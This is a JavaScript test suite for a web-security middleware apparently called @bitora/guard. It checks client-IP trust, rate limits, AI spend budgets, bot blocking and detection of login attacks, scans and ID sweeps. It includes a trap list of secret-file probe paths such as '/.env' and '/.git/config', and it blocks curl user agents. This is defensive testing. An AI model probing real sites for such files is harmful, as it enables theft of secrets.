// Tests of @bitora/guard. Run with: node --test internal/guardpkg/guard.test.mjs
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { createGuard, describe } from './pkg/index.js'
import { bitoraExpress } from './pkg/express.js'
import { bitoraMiddleware } from './pkg/next.js'
import { bitoraHono } from './pkg/hono.js'
import { bitoraStore, memoryStore, redisStore, upstashStore } from './pkg/store.js'

const req = (path, { ip = '203.0.113.7', agent = 'Mozilla/5.0 Chrome/120', method = 'GET' } = {}) =>
  new Request('https://shop.example.com' + path, { method, headers: { 'x-forwarded-for': ip, 'user-agent': agent } })

// A fake Bitora: records what it is sent and answers the decisions API with what the test says.
function fakeBitora({ action = 'allow', mode = 'balanced', delay = 0, fail = false, blocked = [] } = {}) {
  const calls = { checks: [], lists: 0, events: [] }
  const fetch = async (url, init = {}) => {
    if (delay) await new Promise((r) => setTimeout(r, delay))
    if (init.signal?.aborted) throw new Error('aborted')
    if (fail) throw new Error('down')
    if (url.includes('/decisions/check')) {
      calls.checks.push(url)
      return { ok: true, json: async () => ({ action, mode, ttl: 60 }) }
    }
    if (url.includes('/decisions/active')) {
      calls.lists++
      return { ok: true, json: async () => ({ mode, ttl: 60, decisions: blocked.map((ip) => ({ ip, action: 'block', expires_at: new Date(Date.now() + 600000).toISOString() })) }) }
    }
    calls.events.push(JSON.parse(init.body).events)
    return { ok: true, json: async () => ({}) }
  }
  return { fetch, calls }
}

// By default these tests sit behind one proxy of their own, which is what a deployment must say to be believed.
const guard = (o = {}) => createGuard({ trustProxy: 1, remote: { enabled: false }, report: { enabled: false }, ...o })

test('the address of the visitor is only taken from a source the visitor cannot write', () => {
  const web = (xff, extra = {}) => new Request('https://x.test/a?b=1', { headers: { 'x-forwarded-for': xff, ...extra } })
  // a header anybody can send is not believed
  assert.deepEqual([describe(web('6.6.6.6')).ip, describe(web('6.6.6.6')).ipSource], ['', 'none'])
  // behind N proxies of yours, the entry N from the right is the one your own proxy wrote
  assert.deepEqual([describe(web('6.6.6.6, 8.8.8.8'), { trustProxy: 1 }).ip, describe(web('6.6.6.6, 8.8.8.8'), { trustProxy: 1 }).ipSource], ['8.8.8.8', 'xff-right'])
  assert.equal(describe(web('6.6.6.6, 8.8.8.8, 10.0.0.1'), { trustProxy: 2 }).ip, '8.8.8.8')
  // a header the owner vouches for
  const cf = describe(web('6.6.6.6', { 'cf-connecting-ip': '1.1.1.1' }), { ipHeader: 'cf-connecting-ip' })
  assert.deepEqual([cf.ip, cf.ipSource], ['1.1.1.1', 'header:cf-connecting-ip'])
  // Node, directly on the internet: the socket, whatever the header says
  const direct = { method: 'GET', url: '/', headers: { 'x-forwarded-for': '6.6.6.6' }, socket: { remoteAddress: '::ffff:8.8.4.4' } }
  assert.deepEqual([describe(direct).ip, describe(direct).ipSource], ['8.8.4.4', 'socket'])
  // Node behind one proxy of yours (its own address is private): what the proxy saw, never what the visitor put first
  const behind = { method: 'GET', url: '/', headers: { 'x-forwarded-for': '6.6.6.6, 8.8.8.8' }, socket: { remoteAddress: '10.0.0.2' } }
  assert.deepEqual([describe(behind).ip, describe(behind).ipSource], ['8.8.8.8', 'xff-right'])
  assert.equal(describe({ headers: {}, url: '/', socket: { remoteAddress: '8.8.8.8' } }).path, '/')
  assert.equal(describe({ method: 'post', originalUrl: '/a/b?x=1', headers: {}, socket: { remoteAddress: '8.8.8.8' } }).path, '/a/b')
})

test('on Vercel the address comes from the header Vercel writes', () => {
  const r = new Request('https://x.test/', { headers: { 'x-vercel-forwarded-for': '8.8.8.8', 'x-forwarded-for': '6.6.6.6' } })
  process.env.VERCEL = '1'
  try {
    const d = describe(r)
    assert.deepEqual([d.ip, d.ipSource], ['8.8.8.8', 'vercel'])
  } finally {
    delete process.env.VERCEL
  }
})

test('rotating x-forwarded-for does not get around a limit', async () => {
  const g = createGuard({ mode: 'enforce', remote: { enabled: false }, report: { enabled: false }, rateLimit: { max: 2, windowSec: 60 } })
  const node = (spoof) => ({ method: 'GET', url: '/', headers: { 'x-forwarded-for': spoof }, socket: { remoteAddress: '8.8.4.4' } })
  assert.equal((await g.check(node('1.1.1.1'))).action, 'allow')
  assert.equal((await g.check(node('2.2.2.2'))).action, 'allow')
  assert.equal((await g.check(node('3.3.3.3'))).status, 429, 'the third request of the same connection is limited, whatever it claims to be')
})

test('without a trustworthy address nothing is limited or reported by address, and nothing is invented', async () => {
  const b = fakeBitora()
  const g = createGuard({ secret: 'bsec_x', mode: 'enforce', fetch: b.fetch, remote: { enabled: false }, rateLimit: { max: 1, windowSec: 60 }, routes: [{ match: '/api/login', max: 1 }], bots: { paths: ['/api/'] } })
  for (let i = 0; i < 5; i++) assert.equal((await g.check(req('/api/login'))).action, 'allow')
  assert.equal((await g.check(req('/api/x', { agent: 'curl/8' }))).status, 403, 'a robot is still recognised by what it says it is')
  await g.flush()
  assert.deepEqual(b.calls.events, [], 'no address, so no report that could be attributed to anybody')
  // a budget charged to a user does not need an address
  const ai = createGuard({ mode: 'enforce', remote: { enabled: false }, report: { enabled: false }, aiBudget: [{ match: '/api/ai', max: 1, windowSec: 3600, key: (r) => r.headers.get('x-user') }] })
  const asUser = () => new Request('https://x.test/api/ai', { headers: { 'x-user': 'ana' } })
  assert.equal((await ai.check(asUser())).action, 'allow')
  assert.equal((await ai.check(asUser())).status, 429)
})

test('observe mode never blocks: it says what it would have done', async () => {
  const g = guard({ rateLimit: { max: 2, windowSec: 60 } })
  for (let i = 0; i < 2; i++) assert.equal((await g.check(req('/'))).action, 'allow')
  const third = await g.check(req('/'))
  assert.equal(third.action, 'allow')
  assert.equal(third.wouldHave, 'rate_limited')
})

test('enforce mode answers 429 with Retry-After once the limit of an IP is exceeded, and other IPs are not affected', async () => {
  const g = guard({ mode: 'enforce', rateLimit: { max: 2, windowSec: 60 } })
  await g.check(req('/'))
  await g.check(req('/'))
  const d = await g.check(req('/'))
  assert.equal(d.action, 'block')
  assert.equal(d.status, 429)
  assert.ok(Number(d.headers['retry-after']) >= 1)
  assert.equal((await g.check(req('/', { ip: '203.0.113.99' }))).action, 'allow')
})

test('a window ends: the same IP can ask again later', async () => {
  let t = 1_000_000
  const g = guard({ mode: 'enforce', rateLimit: { max: 1, windowSec: 10 }, now: () => t })
  assert.equal((await g.check(req('/'))).action, 'allow')
  assert.equal((await g.check(req('/'))).action, 'block')
  t += 11_000
  assert.equal((await g.check(req('/'))).action, 'allow')
})

test('a route has its own, stricter limit', async () => {
  const g = guard({ mode: 'enforce', routes: [{ match: '/api/login', max: 3, windowSec: 60 }] })
  for (let i = 0; i < 3; i++) assert.equal((await g.check(req('/api/login'))).action, 'allow')
  assert.equal((await g.check(req('/api/login'))).action, 'block')
  assert.equal((await g.check(req('/api/products'))).action, 'allow')
})

test('the AI budget is per user when the app says who the user is, and per IP otherwise', async () => {
  const g = guard({ mode: 'enforce', aiBudget: [{ match: '/api/ai', max: 2, windowSec: 3600, key: (r) => r.headers.get('x-user') }] })
  const asUser = (u) => new Request('https://shop.example.com/api/ai/chat', { headers: { 'x-forwarded-for': '203.0.113.7', 'x-user': u } })
  assert.equal((await g.check(asUser('ana'))).action, 'allow')
  assert.equal((await g.check(asUser('ana'))).action, 'allow')
  const over = await g.check(asUser('ana'))
  assert.equal(over.status, 429)
  assert.equal(over.reason, 'ai_budget')
  assert.equal((await g.check(asUser('luis'))).action, 'allow') // same IP, another user, another budget
})

test('automation is stopped only on the protected paths', async () => {
  const g = guard({ mode: 'enforce', bots: { paths: ['/api/'] } })
  assert.equal((await g.check(req('/api/data', { agent: 'curl/8.4.0' }))).status, 403)
  assert.equal((await g.check(req('/api/data', { agent: 'python-requests/2.31' }))).action, 'block')
  assert.equal((await g.check(req('/about', { agent: 'curl/8.4.0' }))).action, 'allow')
  assert.equal((await g.check(req('/api/data'))).action, 'allow')
})

test('static files and preflight requests are never counted', async () => {
  const g = guard({ mode: 'enforce', rateLimit: { max: 1, windowSec: 60 } })
  for (let i = 0; i < 5; i++) assert.equal((await g.check(req('/_next/static/a.js'))).action, 'allow')
  for (let i = 0; i < 5; i++) assert.equal((await g.check(req('/api', { method: 'OPTIONS' }))).action, 'allow')
})

test('what it sees is reported in one batch, aggregated, with where the address came from, and never for a private address', async () => {
  const b = fakeBitora()
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch: b.fetch, remote: { enabled: false }, rateLimit: { max: 1, windowSec: 60 }, bots: { paths: ['/api/'] } })
  await g.check(req('/'))
  for (let i = 0; i < 4; i++) await g.check(req('/'))
  await g.check(req('/api/x', { ip: '203.0.113.50', agent: 'curl/8' }))
  await g.check(req('/', { ip: '10.1.2.3' }))
  await g.check(req('/', { ip: '10.1.2.3' }))
  await g.flush()
  assert.equal(b.calls.events.length, 1)
  const ev = b.calls.events[0]
  const limited = ev.find((e) => e.kind === 'rate_limited' && e.ip === '203.0.113.7')
  assert.equal(limited.count, 4)
  assert.equal(limited.window_s, 60)
  assert.equal(limited.ip_source, 'xff-right')
  assert.equal(ev.find((e) => e.kind === 'bot_blocked').agent, 'curl')
  assert.ok(!ev.some((e) => e.ip === '10.1.2.3'), 'private addresses are not reported')
  await g.flush()
  assert.equal(b.calls.events.length, 1, 'nothing left to send')
})

test('without a secret nothing is ever sent', async () => {
  const b = fakeBitora()
  const g = createGuard({ trustProxy: 1, fetch: b.fetch, rateLimit: { max: 1, windowSec: 60 } })
  for (let i = 0; i < 3; i++) await g.check(req('/'))
  await g.flush()
  assert.equal(b.calls.events.length + b.calls.checks.length + b.calls.lists, 0)
})

test('the list of blocked addresses is downloaded once, however many visitors come, and checked in memory', async () => {
  const b = fakeBitora({ blocked: ['198.51.100.9'], mode: 'balanced' })
  let t = 1_000_000
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch: b.fetch, report: { enabled: false }, now: () => t, remote: { blocking: true } })
  const d = await g.check(req('/', { ip: '198.51.100.9' }))
  assert.equal(d.status, 403)
  assert.equal(d.reason, 'reputation')
  for (let i = 0; i < 50; i++) assert.equal((await g.check(req('/', { ip: '198.51.100.' + (10 + i) }))).action, 'allow')
  assert.equal(b.calls.lists, 1, 'one download for 51 different visitors')
  assert.equal(b.calls.checks.length, 0, 'no question about each address')
  t += 31_000
  await g.check(req('/'))
  await new Promise((r) => setTimeout(r, 10))
  assert.equal(b.calls.lists, 2, 'refreshed after the interval')
})

test('a block is enforced only if the site is not in observe mode, and the first request is not held up', async () => {
  const slow = fakeBitora({ blocked: ['198.51.100.9'], mode: 'strict', delay: 30 })
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch: slow.fetch, report: { enabled: false } })
  const t0 = Date.now()
  assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).action, 'allow')
  assert.ok(Date.now() - t0 < 20, 'it did not wait for Bitora')
  await new Promise((r) => setTimeout(r, 80))
  assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).status, 403, 'the list is ready from the next request')

  const observing = fakeBitora({ blocked: ['198.51.100.9'], mode: 'observe' })
  const g2 = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch: observing.fetch, report: { enabled: false }, remote: { blocking: true } })
  assert.equal((await g2.check(req('/', { ip: '198.51.100.9' }))).action, 'allow')
})

test('fail-open: if Bitora is down, requests go through and a list already held keeps working until it expires', async () => {
  const b = fakeBitora({ blocked: ['198.51.100.9'], mode: 'strict' })
  let down = false
  let t = 1_000_000
  const flaky = (url, init) => (down ? Promise.reject(new Error('down')) : b.fetch(url, init))
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch: flaky, report: { enabled: false }, now: () => t, remote: { blocking: true } })
  assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).status, 403)
  down = true
  t += 40_000
  assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).status, 403, 'the list it already had still applies')
  assert.equal((await g.check(req('/', { ip: '198.51.100.77' }))).action, 'allow', 'and nothing new is blocked')
  const never = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch: () => Promise.reject(new Error('down')), report: { enabled: false } })
  assert.equal((await never.check(req('/'))).action, 'allow')
  assert.equal((await guard({ mode: 'enforce' }).check(null)).action, 'allow', 'a broken request object never throws')
})

test('asking about each address (mode ip) caches no longer than cacheMs, even if the server says more', async () => {
  const b = fakeBitora({ action: 'allow', mode: 'balanced' })
  let t = 1_000_000
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, fetch: b.fetch, report: { enabled: false }, now: () => t, remote: { mode: 'ip', blocking: true, cacheMs: 2000 } })
  await g.check(req('/'))
  await g.check(req('/'))
  assert.equal(b.calls.checks.length, 1, 'cached')
  t += 2500
  await g.check(req('/'))
  assert.equal(b.calls.checks.length, 2, 'the server said 60 s, cacheMs says 2 s')
})

test('the Express adapter ends the response with the status and lets the rest through', async () => {
  const g = guard({ mode: 'enforce', rateLimit: { max: 1, windowSec: 60 } })
  const mw = bitoraExpress(g)
  const run = () =>
    new Promise((resolve) => {
      const res = { headers: {}, setHeader(k, v) { this.headers[k] = v }, end(b) { resolve({ status: this.statusCode, body: b, headers: this.headers }) } }
      mw({ method: 'GET', url: '/', headers: {}, socket: { remoteAddress: '8.8.4.4' } }, res, () => resolve({ passed: true }))
    })
  assert.equal((await run()).passed, true)
  const blocked = await run()
  assert.equal(blocked.status, 429)
  assert.match(blocked.body, /rate_limited/)
  assert.ok(blocked.headers['retry-after'])
})

test('the Next.js adapter returns a response when it blocks and continues otherwise', async () => {
  const g = guard({ mode: 'enforce', rateLimit: { max: 1, windowSec: 60 } })
  const mw = bitoraMiddleware(g)
  const first = await mw(req('/api/x'))
  assert.equal(first.headers.get('x-middleware-next'), '1')
  const second = await mw(req('/api/x'))
  assert.equal(second.status, 429)
  assert.equal((await second.json()).error, 'rate_limited')
})

test('the Hono adapter answers with c.json when it blocks', async () => {
  const g = guard({ mode: 'enforce', rateLimit: { max: 1, windowSec: 60 } })
  const mw = bitoraHono(g)
  let nexted = 0
  const c = { req: { raw: req('/') }, json: (b, s, h) => ({ b, s, h }) }
  await mw(c, async () => nexted++)
  assert.equal(nexted, 1)
  const out = await mw(c, async () => nexted++)
  assert.equal(out.s, 429)
  assert.equal(nexted, 1)
})

test('AI spend: charged by an estimate, settled with the real usage, refused when a budget is spent', async () => {
  const seen = []
  const client = {
    chat: { completions: { create: async (p) => { seen.push(p); return { usage: { total_tokens: 100 } } } } },
    models: { list: () => 'untouched' },
  }
  const g = createGuard({ mode: 'enforce', trustProxy: 1, remote: { enabled: false }, report: { enabled: false }, ai: { maxOutputTokens: 500, perUser: { tokens: 1000, windowSec: 3600 }, global: { tokens: 100000, windowSec: 3600 } } })
  const ana = g.ai.wrap(client, { user: () => 'ana' })
  assert.equal(ana.models.list(), 'untouched', 'what is not a create() call is left alone')
  await ana.chat.completions.create({ messages: [{ role: 'user', content: 'hola' }], max_tokens: 4000 })
  assert.equal(seen[0].max_tokens, 500, 'the output a request may ask for is capped')
  let allowed = 1
  let refusal
  for (let i = 0; i < 30 && !refusal; i++) {
    try {
      await ana.chat.completions.create({ messages: [{ role: 'user', content: 'hola' }] })
      allowed++
    } catch (e) {
      refusal = e
    }
  }
  assert.equal(refusal?.status, 429)
  assert.equal(refusal?.reason, 'user_budget')
  assert.ok(allowed >= 4 && allowed <= 6, 'calls are charged what they really used (100), not what was reserved (about 510): ' + allowed)
  const luis = g.ai.wrap(client, { user: () => 'luis' })
  await luis.chat.completions.create({ messages: [{ role: 'user', content: 'hola' }] }) // another user, another budget
})

test('AI spend: the ceiling of the whole site stops everybody, and observe mode only watches', async () => {
  const client = { messages: { create: async () => ({ usage: { input_tokens: 40, output_tokens: 60 } }) } }
  const mk = (mode) => createGuard({ mode, trustProxy: 1, remote: { enabled: false }, report: { enabled: false }, ai: { maxOutputTokens: 100, perUser: { tokens: 1e9, windowSec: 60 }, global: { tokens: 250, windowSec: 60 } } })
  const g = mk('enforce')
  const a = g.ai.wrap(client, { user: 'ana' })
  const b = g.ai.wrap(client, { user: 'luis' })
  await a.messages.create({ messages: 'hi' })
  await b.messages.create({ messages: 'hi' })
  await assert.rejects(() => a.messages.create({ messages: 'hi' }), (e) => e.reason === 'site_budget' && e.status === 429, 'the third call finds the site budget spent, whoever makes it')
  const watching = mk('observe')
  const w = watching.ai.wrap(client, { user: 'ana' })
  for (let i = 0; i < 6; i++) await w.messages.create({ messages: 'hi', max_tokens: 9999 })
})

test('AI spend is reported to Bitora with the address it was charged to', async () => {
  const b = fakeBitora()
  const client = { messages: { create: async () => ({ usage: { total_tokens: 10 } }) } }
  const g = createGuard({ secret: 'bsec_x', fetch: b.fetch, trustProxy: 1, mode: 'enforce', remote: { enabled: false }, ai: { maxOutputTokens: 10, perUser: { tokens: 20, windowSec: 60 }, global: { tokens: 1e9, windowSec: 60 } } })
  const ai = g.ai.wrap(client, { user: 'ana', ip: '8.8.8.8', ipSource: 'socket' })
  await assert.rejects(async () => { for (let i = 0; i < 5; i++) await ai.messages.create({ messages: 'hello there' }) })
  await g.flush()
  const ev = b.calls.events[0]?.find((e) => e.kind === 'ai_budget')
  assert.ok(ev && ev.ip === '8.8.8.8' && ev.ip_source === 'socket', JSON.stringify(b.calls.events))
})

test('sign-up: shape, throw-away domains, and waves from one address or one network', () => {
  let t = 1_000_000
  const g = createGuard({ now: () => t, remote: { enabled: false }, report: { enabled: false }, signup: { perIp: { max: 2, windowSec: 60 }, perNetwork: { max: 4, windowSec: 60 }, extraDisposable: ['mi-lista.test'] } })
  assert.deepEqual(g.signup({ email: 'ana@gmail.com', ip: '8.8.8.8' }), { action: 'allow', reasons: [] })
  assert.deepEqual(g.signup({ email: 'no es un email', ip: '8.8.4.4' }).reasons, ['invalid_email'])
  assert.deepEqual(g.signup({ email: 'x@Mailinator.com', ip: '9.9.9.9' }).reasons, ['disposable_email'])
  assert.deepEqual(g.signup({ email: 'x@mi-lista.test', ip: '9.9.9.10' }).reasons, ['disposable_email'], 'the owner adds their own')
  g.signup({ email: 'a@gmail.com', ip: '1.1.1.1' })
  g.signup({ email: 'b@gmail.com', ip: '1.1.1.1' })
  assert.deepEqual(g.signup({ email: 'c@gmail.com', ip: '1.1.1.1' }).reasons, ['too_many_from_ip'])
  // many different addresses of one /24 network
  const net = (n) => g.signup({ email: 'u' + n + '@gmail.com', ip: '5.5.5.' + n })
  for (let n = 1; n <= 4; n++) assert.equal(net(n).action, 'allow')
  assert.deepEqual(net(5).reasons, ['too_many_from_network'])
  assert.equal(g.signup({ email: 'ok@gmail.com', ip: '6.6.6.6' }).action, 'allow', 'another network is not affected')
  t += 61_000
  assert.equal(net(6).action, 'allow', 'the window ends')
  assert.equal(g.signup({ email: 'ok@gmail.com' }).action, 'allow', 'without an address only the email is judged')
})

test('the Next.js 16 proxy is the same function under its new name', async () => {
  const { bitoraProxy } = await import('./pkg/next.js')
  const g = guard({ mode: 'enforce', rateLimit: { max: 1, windowSec: 60 } })
  const proxy = bitoraProxy(g)
  assert.equal((await proxy(req('/api/x'))).headers.get('x-middleware-next'), '1')
  assert.equal((await proxy(req('/api/x'))).status, 429)
})

test('the Deno adapter uses the connection address when no trusted header names the visitor', async () => {
  const { bitoraDeno } = await import('./pkg/deno.js')
  const g = createGuard({ mode: 'enforce', remote: { enabled: false }, report: { enabled: false }, rateLimit: { max: 1, windowSec: 60 } })
  const handler = bitoraDeno(g, () => new Response('ok'))
  const info = (host) => ({ remoteAddr: { hostname: host } })
  const r = () => new Request('https://x.test/', { headers: { 'x-forwarded-for': '6.6.6.6' } })
  assert.equal((await handler(r(), info('8.8.4.4'))).status, 200)
  const blocked = await handler(r(), info('8.8.4.4'))
  assert.equal(blocked.status, 429)
  assert.equal((await blocked.json()).error, 'rate_limited')
  assert.equal((await handler(r(), info('8.8.8.8'))).status, 200, 'another connection, another counter, whatever x-forwarded-for says')
})

// ---- detections that read the answers (guard 2.0) ----
const web = (path, { ip = '8.8.8.8', method = 'GET', headers = {} } = {}) =>
  new Request('https://shop.example.com' + path, { method, headers: { 'x-forwarded-for': ip, 'user-agent': 'Mozilla/5.0 Chrome/120', ...headers } })
const clock = () => {
  const c = { t: 1_000_000, now: () => c.t, tick: (ms) => (c.t += ms) }
  return c
}
// A guard that reports into `sent` (flush() delivers it).
const watched = (o = {}) => {
  const sent = []
  const guard = createGuard({
    trustProxy: 1,
    remote: { enabled: false },
    login: { paths: ['/api/login'] },
    secret: 'bsec_x',
    report: { enabled: true, maxBatch: 1000 },
    fetch: async (u, i) => (sent.push(...JSON.parse(i.body).events), { ok: true }),
    ...o,
  })
  return { guard, sent }
}
const g2 = (o = {}) => createGuard({ trustProxy: 1, remote: { enabled: false }, report: { enabled: false }, login: { paths: ['/api/login'] }, ...o })
const login = (guard, ip, account, status = 401) => guard.observe(web('/api/login', { ip, method: 'POST' }), { status, account })

test('brute force: many failures against one account trip the rule; a few typos do not', async () => {
  const { guard, sent } = watched()
  for (let i = 0; i < 4; i++) login(guard, '8.8.8.8', 'ana@x.com') // a person mistyping
  await guard.flush()
  assert.equal(sent.filter((e) => e.kind === 'brute_force').length, 0, 'four typos are not an attack')
  for (let i = 0; i < 8; i++) login(guard, '1.1.1.' + (i + 1), 'ana@x.com') // many addresses, one account
  await guard.flush()
  const ev = sent.find((e) => e.kind === 'brute_force')
  assert.ok(ev && ev.count >= 10 && ev.path === '/api/login' && ev.window_s === 600, JSON.stringify(sent))
  assert.ok(!JSON.stringify(sent).includes('ana@x.com'), 'the account never leaves the server')
})

test('a slow attack that never trips the short window is caught by the daily counter', async () => {
  const c = clock()
  const { guard, sent } = watched({ now: c.now })
  for (let i = 0; i < 30; i++) {
    login(guard, '9.9.9.' + (i % 200), 'boss@x.com')
    c.tick(20 * 60 * 1000) // one attempt every 20 minutes: never ten in ten minutes
  }
  await guard.flush()
  assert.ok(sent.find((e) => e.kind === 'brute_force' && e.window_s === 86400), 'the long counter sees what the short one forgets')
})

test('credential stuffing: one address trying many accounts; one user logging in is fine', async () => {
  const { guard, sent } = watched()
  for (let i = 0; i < 20; i++) login(guard, '8.8.4.4', 'person' + i + '@x.com', 401)
  login(guard, '8.8.8.8', 'me@x.com', 401)
  login(guard, '8.8.8.8', 'me@x.com', 200)
  await guard.flush()
  const e = sent.find((x) => x.kind === 'credential_stuffing')
  assert.ok(e && e.ip === '8.8.4.4' && e.count >= 8, JSON.stringify(sent))
  assert.ok(!sent.some((x) => x.ip === '8.8.8.8'), 'a person who failed once and then got in is not reported')
})

test('password spraying: many accounts failing once across the site blames no address', async () => {
  const { guard, sent } = watched()
  for (let i = 0; i < 30; i++) login(guard, '20.0.' + i + '.1', 'user' + i + '@x.com')
  await guard.flush()
  const e = sent.find((x) => x.kind === 'password_spraying')
  assert.ok(e && e.ip === '' && e.count >= 25, JSON.stringify(sent.map((x) => x.kind)))
  const quiet = watched()
  for (let i = 0; i < 10; i++) login(quiet.guard, '20.0.' + i + '.1', 'user' + i + '@x.com')
  await quiet.guard.flush()
  assert.ok(!quiet.sent.some((x) => x.kind === 'password_spraying'), 'ten failures on a busy site are normal')
})

test('user enumeration: an address asking for many accounts that do not exist', async () => {
  const { guard, sent } = watched()
  for (let i = 0; i < 6; i++) guard.auth.failed({ ip: '8.8.4.4', username: 'nobody' + i, reason: 'unknown_user' })
  guard.auth.failed({ ip: '8.8.8.8', username: 'real', reason: 'bad_password' })
  await guard.flush()
  assert.ok(sent.some((x) => x.kind === 'user_enumeration' && x.ip === '8.8.4.4'))
  assert.ok(!sent.some((x) => x.ip === '8.8.8.8'))
})

test('scans: a run of different pages that do not exist; a few broken links do not count', async () => {
  const { guard, sent } = watched()
  for (let i = 0; i < 3; i++) guard.observe(web('/old-page-' + i, { ip: '8.8.8.8' }), { status: 404 })
  for (let i = 0; i < 15; i++) guard.observe(web('/admin-' + i, { ip: '8.8.4.4' }), { status: 404 })
  await guard.flush()
  assert.ok(sent.some((x) => x.kind === 'scan_probe' && x.ip === '8.8.4.4'))
  assert.ok(!sent.some((x) => x.ip === '8.8.8.8'))
})

test('forced browsing: a user denied on many different routes, not on the same one again and again', async () => {
  const a = watched({ user: () => 'u1' })
  for (let i = 0; i < 12; i++) a.guard.observe(web('/api/area' + i), { status: 403 })
  const b = watched({ user: () => 'u2' })
  for (let i = 0; i < 12; i++) b.guard.observe(web('/api/private'), { status: 403 })
  await a.guard.flush()
  await b.guard.flush()
  assert.ok(a.sent.some((x) => x.kind === 'forced_browsing'))
  assert.ok(!b.sent.some((x) => x.kind === 'forced_browsing'))
})

test('id sweep: a user reading dozens of different ids of one route; opening a few records is normal', async () => {
  const { guard, sent } = watched({ user: (r) => r.headers.get('x-user') })
  for (let i = 1; i <= 40; i++) guard.observe(web('/api/invoices/' + (1000 + i), { headers: { 'x-user': 'mallory' } }), { status: 200 })
  for (let i = 1; i <= 6; i++) guard.observe(web('/api/invoices/' + (2000 + i), { headers: { 'x-user': 'alice' } }), { status: 200 })
  await guard.flush()
  const e = sent.find((x) => x.kind === 'id_sweep')
  assert.ok(e && e.path === '/api/invoices/:id' && e.count >= 30, JSON.stringify(sent))
  assert.equal(sent.filter((x) => x.kind === 'id_sweep').length, 1, 'reported once, not once per request')
  assert.ok(!JSON.stringify(sent).includes('1001'), 'the ids never leave the server')
})

test('trap addresses: .env and wp-login are scanners; /api/.env too; normal pages are not', async () => {
  const { guard, sent } = watched({ mode: 'enforce' })
  for (const p of ['/.env', '/wp-login.php', '/.git/config', '/api/.env', '/phpmyadmin/index.php']) {
    assert.equal((await guard.check(web(p, { ip: '5.5.5.5' }))).action, 'block', p)
  }
  for (const p of ['/', '/blog/environment', '/api/login', '/.well-known/security.txt', '/about-wordpress-themes']) assert.equal((await guard.check(web(p, { ip: '8.8.8.8' }))).action, 'allow', p)
  await guard.flush()
  assert.ok(sent.some((x) => x.kind === 'trap_hit' && x.action === 'blocked'))
  const owner = g2({ mode: 'enforce', traps: { except: ['/wp-login.php'] } })
  assert.equal((await owner.check(web('/wp-login.php'))).action, 'allow', 'a site that really runs WordPress says so')
})

test('observe mode only says what it would have done with a trap', async () => {
  const { guard, sent } = watched()
  assert.equal((await guard.check(web('/.env', { ip: '8.8.4.4' }))).action, 'allow')
  await guard.flush()
  assert.ok(sent.some((x) => x.kind === 'trap_hit' && x.would_have === true && x.action === 'reported'))
})

test('cross-site writes are reported by default and blocked only when asked; same-site and reads pass', async () => {
  const cross = { 'sec-fetch-site': 'cross-site' }
  assert.equal((await g2({ mode: 'enforce' }).check(web('/api/pay', { method: 'POST', headers: cross }))).action, 'allow', 'report-only by default')
  const strict = g2({ mode: 'enforce', csrf: { block: true, exempt: ['/api/webhooks/'] } })
  assert.equal((await strict.check(web('/api/pay', { method: 'POST', headers: cross }))).action, 'block')
  assert.equal((await strict.check(web('/api/pay', { method: 'POST', headers: { 'sec-fetch-site': 'same-origin' } }))).action, 'allow')
  assert.equal((await strict.check(web('/api/pay', { method: 'GET', headers: cross }))).action, 'allow')
  assert.equal((await strict.check(web('/api/webhooks/stripe', { method: 'POST', headers: cross }))).action, 'allow', 'a webhook is meant to come from outside')
  assert.equal((await strict.check(web('/api/pay', { method: 'POST' }))).action, 'allow', 'no header (curl, old browser): nothing to judge')
})

test('size and shape: a huge URL, a body over the limit, a method the route does not take', async () => {
  const g = g2({ mode: 'enforce', limits: { maxBodyBytes: 1000, methods: [{ match: '/api/login', allow: ['POST'] }] } })
  assert.equal((await g.check(web('/x?q=' + 'a'.repeat(9000), { ip: '8.8.1.1' }))).status, 414)
  assert.equal((await g.check(web('/api/upload', { ip: '8.8.1.2', method: 'POST', headers: { 'content-length': '5000' } }))).status, 413)
  assert.equal((await g.check(web('/api/upload', { ip: '8.8.1.3', method: 'POST', headers: { 'content-length': '500' } }))).action, 'allow')
  assert.equal((await g.check(web('/api/login', { ip: '8.8.1.4', method: 'DELETE' }))).status, 405)
  assert.equal((await g.check(web('/api/login', { ip: '8.8.1.5', method: 'POST' }))).action, 'allow')
})

test('JSON shape: depth and number of keys, with a budget', async () => {
  const { jsonShape } = await import('./pkg/detect.js')
  let deep = {}
  for (let i = 0; i < 50; i++) deep = { a: deep }
  assert.ok(jsonShape(deep).depth >= 50)
  assert.deepEqual(jsonShape({ a: 1, b: { c: 2 } }), { depth: 2, keys: 3 })
})

test('reputation: findings add up, fade with time, and only slow down or block in enforce', async () => {
  const c = clock()
  const g = g2({ mode: 'enforce', now: c.now })
  const ip = '8.8.4.4'
  await g.check(web('/.env', { ip })) // 5 points: S = 0.68
  const d = await g.check(web('/', { ip }))
  assert.equal(d.status, 429, 'between 0.65 and 0.88 the answer is a 429, never a delay')
  assert.ok(d.headers['retry-after'])
  await g.check(web('/wp-login.php', { ip }))
  assert.equal((await g.check(web('/', { ip }))).status, 403, 'from 0.88 it is blocked')
  c.tick(10 * 60 * 1000) // ten minutes: the score has faded
  assert.equal((await g.check(web('/', { ip }))).action, 'allow')
  assert.equal((await g.check(web('/', { ip: '8.8.8.8' }))).action, 'allow', 'other addresses are not affected')
  const watching = g2({ now: c.now })
  await watching.check(web('/.env', { ip }))
  const w = await watching.check(web('/', { ip }))
  assert.equal(w.action, 'allow', 'observe mode never blocks')
  assert.equal(w.wouldHave, 'reputation_local')
})

test('an address that cannot be trusted earns no score', async () => {
  const g = createGuard({ mode: 'enforce', remote: { enabled: false }, report: { enabled: false } }) // no trustProxy: x-forwarded-for is not believed
  for (let i = 0; i < 5; i++) assert.equal((await g.check(web('/'))).action, 'allow')
  assert.equal((await g.check(web('/.env'))).action, 'block', 'the trap still answers, but it blames nobody')
  assert.equal((await g.check(web('/'))).action, 'allow')
})

test('the Express adapter reads the answer of the app and counts failed logins by account', async () => {
  const { guard, sent } = watched()
